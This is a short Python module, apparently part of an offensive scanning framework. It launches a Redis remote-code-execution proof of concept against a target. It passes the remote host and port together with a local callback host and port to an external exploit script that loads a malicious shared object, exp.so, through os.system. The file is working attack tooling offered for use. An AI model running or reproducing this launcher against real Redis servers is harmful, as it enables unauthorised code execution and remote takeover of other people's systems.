#!/user/bin/env python3
# -*- coding: utf-8 -*-
import os
from pub.com.outprint import OutPrintInfoErr,OutPrintInfo
class Redis_Scan_Run:
    def main(self,target):
        rip = target["rhost"]
        rp = target["rport"]
        lip = target["lhost"]
        lp = target["lport"]
        try:
            os.system(f"cd cve/Redis/Redis_Rce && python Redis_Rce_Poc.py -r {rip} -p {rp} -L {lip} -P {lp} -f ./exp.so")
            # sys.exit()
        except Exception as e:
            OutPrintInfoErr(e)